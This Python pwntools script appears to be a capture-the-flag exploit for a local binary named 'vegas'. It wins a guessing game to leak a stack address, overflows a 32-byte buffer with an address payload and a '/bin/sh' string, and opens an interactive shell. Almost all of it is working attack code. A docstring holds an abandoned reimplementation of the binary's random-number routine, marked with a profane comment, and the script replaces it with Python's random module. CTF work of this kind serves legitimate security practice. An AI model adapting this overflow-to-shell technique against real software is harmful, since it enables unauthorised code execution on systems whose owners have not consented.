import random
from pwn import *

p = process("./vegas")
context.log_level = 'info'
def initialize():
    global p
    p.close()
    p = process("./vegas")

def shuffle_random_table():
    """
    idx = 0x0b
    v0 = idx
    v1 = random_table[idx]
    v2 = (idx+15)&0xf
    v3 = random_table[(idx+13) & 0xf]
    v4 = random_table[v2]
    v5 = (random_table[idx] << 16) & 0xffffffff
    idx = (idx+15)&0xf
    v6 = v3 ^ v5 ^ v1 ^ ((v3 << 15) & 0xffffffff)
    v7 = random_table[(v0+9)&0xf] ^ (random_table[(v0+9)&0xf] >> 11)
    random_table[(v0 + 10) & 0xF] = v7 ^ v6
    result = 8 * (v7 ^ v6) & 0xDEADBEE8 ^ ((v7 << 24) & 0xffffffff) ^ ((v6 << 10) & 0xffffffff) ^ v7 ^ v4 ^ (2 * v4))
    random_table[v2] = result
    return result

    ... fuck it, i'm really fed up with duplicating such a complicated routine
    """
    return random.randint(0, 0xffffffff)

stack_addr = 0

def guess(buf):
    global stack_addr 
    p.recvuntil("Score: ")
    curr_score = int(p.recvuntil("\n"))
    p.recvuntil("Choice:\n")
    p.sendline("1")
    p.recvuntil("Not sure\n")

    num = shuffle_random_table()
    if num & 1:
        p.sendline("1")
    else:
        p.sendline("2")

    if curr_score >= 0:
        p.sendline(buf[curr_score])
    else:
        p.sendline()
    
    ans = p.recvuntil("Your score: ")
    number = int(p.recvuntil("\n"))
    if number == len(buf):
        if number == 32:
            start_addr = ans.find('A' * 32) + 32
            stack_addr = u32(ans[start_addr : start_addr + 4])
        return (True, 0)
    else:
        return (False, number)

def submit():
    p.recvuntil("Choice:\n")
    p.sendline("2")

def trying(overwritten):
    while True:
        (result, number) = guess(overwritten)
        if result == True: return True
        else:
            if number < -10:
                print "[-] the number was too decreased. Retry..."
                return False



cond = False
while cond == False:
    initialize()
    cond = trying(''.ljust(32, 'A'))
    print hex(stack_addr)
    addr = stack_addr 
    payload = ''.ljust(32, 'A') + p32(addr - 24) + p32(0x80484e0) + p32(addr) + p32(addr - 0xffb5eae0 + 0xffb5eb10 - 0x40) + '/bin/sh\x00'
    cond = trying(payload)

p.interactive()


